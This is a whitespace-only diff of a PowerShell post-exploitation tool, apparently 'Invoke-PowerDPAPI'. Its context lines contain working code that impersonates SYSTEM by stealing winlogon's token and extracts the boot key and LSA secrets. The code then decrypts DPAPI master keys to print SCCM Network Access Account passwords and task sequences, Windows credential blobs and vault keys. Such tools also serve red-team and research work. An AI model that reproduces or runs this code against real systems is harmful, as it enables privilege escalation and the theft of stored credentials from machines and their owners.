@@ -4,7 +4,7 @@ function Invoke-FunctionLookup {
     # Load the CLR helper type from System.dll
     $gacAsm = [AppDomain]::CurrentDomain.GetAssemblies() |
         Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll' }
-    
+
     $helperType = $gacAsm.GetType('Microsoft.Win32.UnsafeNativeMethods')
     $ptrOverload = $helperType.GetMethod('GetProcAddress', [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static, $null, [Type[]] @([IntPtr], [string]),$null)
 
@@ -84,47 +84,47 @@ $FnRevertToSelf            = [Runtime.InteropServices.Marshal]::GetDelegateForFu
 function Invoke-Impersonate {
 
     $currentSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
-    
+
     if ($currentSid -eq 'S-1-5-18')
-    { 
-        return $true 
+    {
+        return $true
     }
 
     $winlogonId = (Get-Process -Name 'winlogon' -ErrorAction Stop | Select-Object -First 1 -ExpandProperty Id)
-    
+
     $processHandle = $FnOpenProcess.Invoke(0x400, $true, [int]$winlogonId)
-    
-    if ($processHandle -eq [IntPtr]::Zero) 
-    { 
+
+    if ($processHandle -eq [IntPtr]::Zero)
+    {
         return $false
     }
 
     $tokenHandle = [IntPtr]::Zero
-    
+
     if (-not $FnOpenProcessToken.Invoke($processHandle, 0x0E, [ref]$tokenHandle))
-    { 
+    {
         return $false
     }
 
     $dupHandle = [IntPtr]::Zero
-    
+
     if (-not $FnDuplicateTokenEx.Invoke($tokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [ref]$dupHandle))
-    { 
+    {
         return $false
     }
 
     try {
-        
+
         if (-not $FnImpersonateLoggedOnUser.Invoke($dupHandle))
-        { 
+        {
             return $false
         }
-        
+
         $newSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
-        
+
         return ($newSid -eq 'S-1-5-18')
     }
-    
+
     catch
     {
         return $false
@@ -151,17 +151,17 @@ public class Pbkdf2 {
         this.BlockSize = this.Algorithm.HashSize / 8;
         this.BufferBytes = new byte[this.BlockSize];
     }
-    
+
     private readonly int BlockSize;
     private uint BlockIndex = 1;
     private byte[] BufferBytes;
     private int BufferStartIndex = 0;
     private int BufferEndIndex = 0;
-    
+
     public HMAC Algorithm { get; private set; }
     public Byte[] Salt { get; private set; }
     public Int32 IterationCount { get; private set; }
-    
+
     public Byte[] GetBytes(int count, string algorithm = "sha512") {
         byte[] result = new byte[count];
         int resultOffset = 0;
@@ -177,14 +177,14 @@ public class Pbkdf2 {
             this.BufferStartIndex = this.BufferEndIndex = 0;
             resultOffset += bufferCount;
         }
-        
+
         while (resultOffset < count) {
             int needCount = count - resultOffset;
             if (algorithm.ToLower() == "sha256")
                 this.BufferBytes = this.Func(false);
             else
                 this.BufferBytes = this.Func();
-                
+
             if (needCount > this.BlockSize) {
                 Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, this.BlockSize);
                 resultOffset += this.BlockSize;
@@ -197,14 +197,14 @@ public class Pbkdf2 {
         }
         return result;
     }
-    
+
     private byte[] Func(bool mscrypto = true) {
         var hash1Input = new byte[this.Salt.Length + 4];
         Buffer.BlockCopy(this.Salt, 0, hash1Input, 0, this.Salt.Length);
         Buffer.BlockCopy(GetBytesFromInt(this.BlockIndex), 0, hash1Input, this.Salt.Length, 4);
         var hash1 = this.Algorithm.ComputeHash(hash1Input);
         byte[] finalHash = hash1;
-        
+
         for (int i = 2; i <= this.IterationCount; i++) {
             hash1 = this.Algorithm.ComputeHash(hash1, 0, hash1.Length);
             for (int j = 0; j < this.BlockSize; j++) {
@@ -213,14 +213,14 @@ public class Pbkdf2 {
             if (mscrypto)
                 Array.Copy(finalHash, hash1, hash1.Length);
         }
-        
-        if (this.BlockIndex == uint.MaxValue) { 
-            throw new InvalidOperationException("Derived key too long."); 
+
+        if (this.BlockIndex == uint.MaxValue) {
+            throw new InvalidOperationException("Derived key too long.");
         }
         this.BlockIndex += 1;
         return finalHash;
     }
-    
+
     private static byte[] GetBytesFromInt(uint i) {
         var bytes = BitConverter.GetBytes(i);
         if (BitConverter.IsLittleEndian) {
@@ -252,7 +252,7 @@ function Get-BootKey {
         $dummy            = [IntPtr]::Zero
 
         $Result = $FnRegOpenKeyEx.Invoke(0x80000002, $KeyPath, 0x0, 0x19, [ref]$hKey)
-        
+
         if ($Result -ne 0)
         {
             $ErrCode = [System.Runtime.Interopservices.Marshal]::GetLastWin32Error()
@@ -261,7 +261,7 @@ function Get-BootKey {
         }
 
         $Result = $FnRegQueryInfoKey.Invoke($hKey, $ClassVal, [ref]$Len, 0x0, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, [IntPtr]::Zero)
-        
+
         if ($Result -ne 0)
         {
             $ErrCode = [System.Runtime.Interopservices.Marshal]::GetLastWin32Error()
@@ -297,14 +297,14 @@ function Get-LsaSha256Hash {
     }
 
     $sha256 = [System.Security.Cryptography.SHA256]::Create()
-    
+
     try
-    { 
-        return $sha256.ComputeHash($buffer) 
+    {
+        return $sha256.ComputeHash($buffer)
     }
-    
+
     finally
-    { 
+    {
         $sha256.Dispose()
     }
 }
@@ -316,7 +316,7 @@ function Get-LsaAesDecrypt {
     # Hand-off: Returns decrypted data to Get-LSAKey/Get-LSASecret for LSA secret extraction.
 
     $aes = [System.Security.Cryptography.AesManaged]::new()
-    try 
+    try
     {
         $aes.Key       = $Key
         $aes.IV        = New-Object byte[] 16
@@ -328,7 +328,7 @@ function Get-LsaAesDecrypt {
         $chunks        = [int][math]::Ceiling($Data.Length / 16)
         $plaintext     = New-Object byte[] ($chunks * 16)
 
-        for ($i = 0; $i -lt $chunks; $i++) 
+        for ($i = 0; $i -lt $chunks; $i++)
         {
             $offset        = $i * 16
             $chunk         = New-Object byte[] 16
@@ -339,8 +339,8 @@ function Get-LsaAesDecrypt {
 
         return $plaintext
     }
-    
-    finally 
+
+    finally
     {
         $transform.Dispose()
         $aes.Dispose()
@@ -379,7 +379,7 @@ function Get-LSASecret {
     $LSAKey       = Get-LSAKey
     $RegistryPath = "HKLM:\SECURITY\Policy\Secrets\$SecretName\CurrVal"
 
-    try 
+    try
     {
         $RegistryKey = Get-Item -Path $RegistryPath -ErrorAction Stop
         $KeyData     = $RegistryKey.GetValue("")
@@ -396,7 +396,7 @@ function Get-LSASecret {
         $keyEncryptedDataRemainder    = $keyEncryptedData[32..($keyEncryptedData.Length-1)]
         $keyPathPlaintext             = Get-LsaAesDecrypt -Key $tmpKey -Data $keyEncryptedDataRemainder
 
-        if ($SecretName -eq "DPAPI_SYSTEM") 
+        if ($SecretName -eq "DPAPI_SYSTEM")
         {
             return $keyPathPlaintext[20..59]
         }
@@ -404,8 +404,8 @@ function Get-LSASecret {
         Write-Warning "LSA Secret '$SecretName' not implemented"
         return $null
     }
-    
-    catch 
+
+    catch
     {
         Write-Warning "Error accessing registry: $_"
         return $null
@@ -600,23 +600,23 @@ function Decrypt-MasterKeyWithSha {
 
     if ($algCrypt -eq 26128 -and $algHash -eq 32782)
     {
-        
+
         # CALG_AES_256 with CALG_SHA_512
         $masterKeySha1 = Decrypt-Aes256HmacSha512 -ShaBytes $shaBytes -Final $derivedPreKey -EncData $encData
         $masterKeyStr  = ($masterKeySha1 | ForEach-Object { $_.ToString("X2") }) -join ""
         return @{ $guid = $masterKeyStr }
     }
-    
-    elseif ($algCrypt -eq 26115 -and ($algHash -eq 32777 -or $algHash -eq 32772)) 
+
+    elseif ($algCrypt -eq 26115 -and ($algHash -eq 32777 -or $algHash -eq 32772))
     {
-        
+
         # CALG_3DES with CALG_HMAC or CALG_SHA1
         $masterKeySha1 = Decrypt-TripleDESHmac -Final $derivedPreKey -EncData $encData
         $masterKeyStr  = ($masterKeySha1 | ForEach-Object { $_.ToString("X2") }) -join ""
         return @{ $guid = $masterKeyStr }
     }
-    
-    else 
+
+    else
     {
         throw "Alg crypt '$algCrypt / 0x{0:X8}' not currently supported!" -f $algCrypt
     }
@@ -631,18 +631,18 @@ function Describe-DPAPIBlob {
     # Hand-off: Uses MasterKeys hashtable. Returns decrypted data to Decrypt-NAA.
 
     $offset = 0
-    
+
     if ($blobType -eq "credential")
-    { 
+    {
         $offset = 36
     }
-    
+
     elseif ($blobType -in @("policy","blob","rdg","chrome","keepass"))
-    { 
+    {
         $offset = 24
     }
-    
-    else 
+
+    else
     {
         Write-Host "[!] Unsupported blob type: $blobType"
         return ,@()
@@ -660,16 +660,16 @@ function Describe-DPAPIBlob {
 
     $flags    = [BitConverter]::ToUInt32($blobBytes, $offset)
     $offset  += 4
-    
+
     if ($blobType -notin "rdg","chrome")
     {
         $flagInfo = "0x$($flags.ToString('X8'))"
-        
+
         if ($flags -eq 0x20000000)
-        { 
+        {
             $flagInfo += " (CRYPTPROTECT_SYSTEM)"
         }
-        
+
         Write-Host "    flags            : $flagInfo"
     }
 
@@ -713,7 +713,7 @@ function Describe-DPAPIBlob {
         {
             return [System.Security.Cryptography.ProtectedData]::Unprotect($blobBytes,$entropy,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
         }
-        
+
         catch
         {
             return [System.Text.Encoding]::Unicode.GetBytes("MasterKey needed - $guidString")
@@ -723,41 +723,41 @@ function Describe-DPAPIBlob {
     if ($MasterKeys.ContainsKey($guidString))
     {
         $keyBytes = [System.Collections.Generic.List[byte]]::new()
-        
+
         for ($i = 0; $i -lt $MasterKeys[$guidString].Length; $i += 2)
         {
             $keyBytes.Add([Convert]::ToByte($MasterKeys[$guidString].Substring($i, 2), 16))
         }
-        
+
         $keyBytes = $keyBytes.ToArray()
 
-        try 
+        try
         {
             $hmac = $null
-            
+
             if($algHash -eq 32772)
-            { 
+            {
                 $hmac = [System.Security.Cryptography.HMACSHA1]::new($keyBytes)
             }
-            
+
             elseif ($algHash -eq 32782)
-            { 
+            {
                 $hmac = [System.Security.Cryptography.HMACSHA512]::new($keyBytes)
             }
-            
-            else 
+
+            else
             {
                 Write-Host "    [!] Unsupported hash algorithm: $algHash"
                 return ,@()
             }
 
             $inputBytes      = $saltBytes
-            
+
             if ($entropy)
-            { 
+            {
                 $inputBytes += $entropy
             }
-            
+
             $derivedKeyBytes = $hmac.ComputeHash($inputBytes)
             $hmac.Dispose()
 
@@ -776,20 +776,20 @@ function Describe-DPAPIBlob {
 
             return $decrypted
         }
-        
+
         catch
         {
             Write-Host "    [X] Error during decryption: $_"
         }
     }
-    
+
     else
     {
         if ($blobType -in "rdg","chrome")
         {
             return [System.Text.Encoding]::Unicode.GetBytes("MasterKey needed - $guidString")
         }
-        
+
         else
         {
             Write-Host "    [!] MasterKey GUID not in cache: $guidString"
@@ -801,7 +801,7 @@ function Describe-DPAPIBlob {
 
 function Decrypt-Blob {
     param ([byte[]] $ciphertext, [byte[]] $key,[int] $algId)
-    
+
     # Decrypts ciphertext using 3DES or AES-256 based on algorithm ID. Helper for Describe-DPAPIBlob.
     # Hand-off: Returns plaintext to Describe-DPAPIBlob.
 
@@ -819,23 +819,23 @@ function Decrypt-Blob {
                 $decryptor = $des.CreateDecryptor()
                 return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
             }
-            
+
             catch
             {
                 Write-Warning "3DES decryption failed: $_"
                 return $null
             }
-            
+
             finally
             {
-                
+
                 if ($des)
-                { 
+                {
                     $des.Dispose()
                 }
             }
         }
-        
+
         26128 {  # CALG_AES_256
             $ivBytes    = New-Object byte[] 16
             $aes        = New-Object System.Security.Cryptography.AesManaged
@@ -854,17 +854,17 @@ function Decrypt-Blob {
                 Write-Warning "AES decryption failed: $_"
                 return $null
             }
-            
+
             finally
             {
                 if ($aes)
-                { 
+                {
                     $aes.Dispose()
                 }
             }
         }
-        
-        default 
+
+        default
         {
             return "[!] Unsupported algorithm: $algId"
         }
@@ -926,7 +926,7 @@ function Decrypt-NAA {
             if (Is-Unicode $decBytesRaw)
             {
                 $finalIndex = [Array]::LastIndexOf($decBytesRaw, [byte]0)
-                
+
                 if ($finalIndex -gt 1)
                 {
                     $decBytes = New-Object byte[] ($finalIndex + 1)
@@ -934,37 +934,37 @@ function Decrypt-NAA {
                     $data = [System.Text.Encoding]::Unicode.GetString($decBytes)
 
                   # Write-Host "    dec(blob)        : $data"
-                    
+
                     return $data
                 }
-                
+
                 else
                 {
                     $data = [System.Text.Encoding]::ASCII.GetString($decBytesRaw)
                     if ($TaskSequence){ return $data }
-                  
+
                   # Write-Host "    dec(blob)        : $data"
-                    
+
                     return $data
                 }
             }
-            
+
             else
             {
                 $hexData = ($decBytesRaw | ForEach-Object { $_.ToString("X2") }) -join " "
-              
+
               # Write-Host "    dec(blob)        : $hexData"
-                
+
                 return $hexData
             }
         }
-        
+
         else
         {
             return $null
         }
     }
-    
+
     else
     {
         return $null
@@ -988,7 +988,7 @@ function Triage-SystemMasterKeys {
     $rootPath = "$env:SystemRoot\System32\Microsoft\Protect\"
 
     Get-ChildItem -Path $rootPath -Recurse -Force | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
-        
+
         if ([Regex]::IsMatch($_.Name, "^(\{{0,1}([0-9a-fA-F]){8}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){12}\}{0,1})$"))
         {
             try
@@ -1009,7 +1009,7 @@ function Triage-SystemMasterKeys {
                     $global:mappings[$key] = $plainTextMasterKey[$key]
                 }
             }
-            
+
             catch
             {
                 Write-Host "[!] Error triaging $($_.FullName): $($_.Exception.Message)"
@@ -1018,12 +1018,12 @@ function Triage-SystemMasterKeys {
     }
 
     Write-Host "[*] SYSTEM master key cache:"
-    
+
     foreach ($key in $global:mappings.Keys)
     {
         Write-Host "$key`:$($global:mappings[$key])"
     }
-    
+
     Write-Host "`n`n"
 
     return $global:mappings
@@ -1051,18 +1051,18 @@ function Decrypt-LocalNetworkAccessAccountsWmi {
             {
                 Write-Host "[!] SCCM is configured to use the client's machine account instead of NAA`n"
             }
-            
+
             else
             {
                 Write-Host "`n"
-                
+
                 Write-Host "    Network Access Username: $username"
                 Write-Host "    Network Access Password: $password"
-                
+
                 Write-Host "`n"
             }
         }
-        
+
         catch
         {
             Write-Host "[!] Error decrypting NAA credentials: $_"
@@ -1121,24 +1121,24 @@ function Decrypt-LocalTaskSequencesWMI {
                             Format-XML $sequenceXml | Write-Host -ForegroundColor Gray
                             $xmlPrinted = $true
                             Write-Host
-                            
+
                             if ($global:NoSave)
                             {
                                 continue
                             }
-                            
+
                             $timestamp = Get-Date -Format "yyyy"
                             $Random = Get-Random -Minimum 1 -Maximum 10000
                             $cleanName = $taskSequence.Name -replace '[^\w\s-]', ''
                             $fileName = "TaskSequence_${cleanName}_${timestamp}_${Random}.xml"
-                            
+
                             Start-Sleep -Milliseconds 10
                             $sequenceXml.Save((Join-Path -Path $pwd -ChildPath $fileName))
-                            
+
                             Write-Host "`n"
                             Write-Host "[+]    Saved XML to: $fileName"
                         }
-                        
+
                         catch
                         {
                             Write-Host "    [!] Extracted content is not valid XML"
@@ -1150,16 +1150,16 @@ function Decrypt-LocalTaskSequencesWMI {
                 {
                     Write-Host "    Decrypted Value: $plaintext"
                 }
-                
+
                 Write-Host "`n"
             }
-            
+
             else
             {
                 Write-Host "[!] No CDATA found in Task Sequence: $($taskSequence.Name)" -ForegroundColor "Yellow"
             }
         }
-        
+
         catch
         {
             Write-Host "[!] Error decrypting Task Sequence '$($taskSequence.Name)': $_" -ForegroundColor "Yellow"
@@ -1183,7 +1183,7 @@ function Triage-SccmWMI {
         Write-Host "[+] Found $($naa.Count) Network Access Account(s)"
         Decrypt-LocalNetworkAccessAccountsWmi -NetworkAccessAccounts $naa -MasterKeys $MasterKeys
     }
-    
+
     else
     {
         Write-Host "[!] No Network Access Accounts found"
@@ -1194,7 +1194,7 @@ function Triage-SccmWMI {
         Write-Host "[+] Found $($tasks.Count) Task Sequence(s)"
         Decrypt-LocalTaskSequencesWMI -TaskSequences $tasks -MasterKeys $MasterKeys
     }
-    
+
     else
     {
         Write-Host "[!] No Task Sequences found"
@@ -1312,18 +1312,18 @@ function Triage-SccmDisk {
 
                             }
 
-                            else 
+                            else
                             {
                                 $secretPlaintext = Decrypt-NAA -Blob $groupValue -MasterKeys $MasterKeys
                                 $xmlMatch = Select-String -InputObject $secretPlaintext -Pattern "<sequence[^>]*?>.*?</sequence>" -AllMatches
                                 $xmlPrinted = $false
-    
+
                                 if ($xmlMatch.Matches.Count -gt 0)
                                 {
-                                    
-                                    foreach ($match in $xmlMatch.Matches) 
+
+                                    foreach ($match in $xmlMatch.Matches)
                                     {
-                                    
+
                                         Write-Host "`n"
                                         $sequenceXml = [xml]$match.Value
                                         Format-XML $sequenceXml | Write-Host -ForegroundColor "Gray"
@@ -1339,7 +1339,7 @@ function Triage-SccmDisk {
                                             $Random = Get-Random -Minimum 1 -Maximum 10000
                                             $cleanName = $taskSequence.Name -replace '[^\w\s-]', ''
                                             $fileName = "TaskSequence_${cleanName}_${timestamp}_${Random}.xml"
-                            
+
                                             Start-Sleep -Milliseconds 10
                                             $sequenceXml.Save((Join-Path -Path $pwd -ChildPath $fileName))
 
@@ -1347,20 +1347,20 @@ function Triage-SccmDisk {
                                             Write-Host "[+]    Saved XML to: $fileName"
                                         }
                                     }
-                                    
+
                                     $xmlPrinted = $true
                                 }
-                            
+
                            if (-not $xmlPrinted)
                             {
                                 # Not sure how needed this is.. At this point this is usually garbage data that only serves to clutter the output
                                 #Write-Host "`n    Plaintext secret: $secretPlaintext"
                             }
-                           
+
                            }
 
                         }
-                        
+
                         catch
                         {
                             Write-Host "`n[!] Data was not decrypted (Redacted Output)"
@@ -1479,7 +1479,7 @@ function Describe-Credential {
         Write-Host "    [X] Decryption failed or returned no data."
         return
     }
-    
+
     Parse-DecCredBlob -DecBlobBytes $plaintextBytes
 }
 
@@ -1506,13 +1506,13 @@ function Parse-DecCredBlob {
 
         $lastWritten = [BitConverter]::ToInt64($DecBlobBytes, $offset)
         $offset += 8
-        
+
         try
         {
             $lastWrittenTime = [DateTime]::FromFileTime($lastWritten)
             $currentDate = Get-Date
-            
-            if (($lastWrittenTime -lt $currentDate.AddYears(-20)) -or 
+
+            if (($lastWrittenTime -lt $currentDate.AddYears(-20)) -or
                 ($lastWrittenTime -gt $currentDate.AddYears(1)))
             {
                 Write-Host "    [!] Decryption failed, likely incorrect password for the associated masterkey"
@@ -1603,7 +1603,7 @@ function Parse-DecCredBlob {
         Write-Host ("    TargetAlias      : {0}" -f $targetAlias.Trim())
         Write-Host ("    Comment          : {0}" -f $comment.Trim())
         Write-Host ("    UserName         : {0}" -f $userName.Trim())
-        
+
         if ($credBlobBytes.Length -gt 0)
         {
             if (Is-Unicode $credBlobBytes)
@@ -1813,20 +1813,20 @@ function Describe-VaultPolicy {
             Write-Host ("    flags            : 0x{0:X8} (CRYPTPROTECT_SYSTEM)" -f 0x20000000)
             Write-Host ("    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)")
             Write-Host ("    description      : Vault Policy Key")
-            
+
             $aes128KeyStr = [BitConverter]::ToString($keys[0]).Replace("-", "")
             Write-Host "    aes128 key       : $aes128KeyStr"
-            
+
             $aes256KeyStr = [BitConverter]::ToString($keys[1]).Replace("-", "")
             Write-Host "    aes256 key       : $aes256KeyStr"
-            
+
             return $keys
-        } 
+        }
         else {
             Write-Host "    [!] Error parsing decrypted Policy.vpol (AES keys not extracted, likely incorrect password for the associated masterkey)"
             return @()
         }
-    } 
+    }
     else {
         Write-Host "    [!] Failed to decrypt Policy.vpol"
         return @()
@@ -2007,11 +2007,11 @@ function Triage-SystemVaults {
     )
 
     foreach ($location in $folderLocations) {
-        if (-not (Test-Path -Path $location -PathType Container)) { 
-            continue 
+        if (-not (Test-Path -Path $location -PathType Container)) {
+            continue
         }
 
-        $vaultDirs = Get-ChildItem -Path $location -Directory | 
+        $vaultDirs = Get-ChildItem -Path $location -Directory |
                      Select-Object -ExpandProperty FullName
 
         foreach ($vaultDir in $vaultDirs) {
@@ -2064,7 +2064,7 @@ function Triage-VaultFolder {
             $vaultCredBytes = [System.IO.File]::ReadAllBytes($VaultCredFile)
             Describe-VaultCred $vaultCredBytes $keys
         }
-        
+
         catch {
             Write-Host "ERROR"
         }
@@ -2091,11 +2091,11 @@ function Invoke-PowerDPAPI
         $MasterKeys = $null
 
                 if ($SaveTS)
-                { 
+                {
                     $global:NoSave  = $false
                 }
 
-                else 
+                else
                 {
                     $global:NoSave  = $true
                 }
@@ -2103,9 +2103,9 @@ function Invoke-PowerDPAPI
         switch ($Command)
         {
             "MachineTriage"
-            
+
             {
-              
+
                 $MasterKeys         = Triage-SystemMasterKeys
                 Triage-SystemCreds  -MasterKeys $MasterKeys
                 Triage-SccmWMI      -MasterKeys $MasterKeys
@@ -2114,54 +2114,54 @@ function Invoke-PowerDPAPI
             }
 
             "MachineVaults"
-            
+
             {
                 $MasterKeys         = Triage-SystemMasterKeys
                 Triage-SystemVaults -MasterKeys $MasterKeys
             }
 
             "MachineCredentials"
-            
+
             {
                 $MasterKeys        = Triage-SystemMasterKeys
                 Triage-SystemCreds -MasterKeys $MasterKeys
             }
 
             "SCCM"
-            
+
             {
-                
+
                 $MasterKeys        = Triage-SystemMasterKeys
                 Triage-SccmWMI     -MasterKeys $MasterKeys
                 Triage-SccmDisk    -MasterKeys $MasterKeys
             }
 
             "SCCM_WMI"
-            
+
             {
-                
+
                 $MasterKeys        = Triage-SystemMasterKeys
                 Triage-SccmWMI     -MasterKeys $MasterKeys
             }
 
             "SCCM_DISK"
-            
+
             {
                 $MasterKeys       = Triage-SystemMasterKeys
                 Triage-SccmDisk   -MasterKeys $MasterKeys
             }
 
             Default
-            
+
             {
                 Write-Host "[*] Command not recognised"
             }
         }
     }
-    
+
     finally
     {
-        
+
         if (Get-Variable -Name "mappings" -Scope "Global" -ErrorAction "SilentlyContinue")
         {
             Remove-Variable -Name "mappings" -Scope "Global" -Force
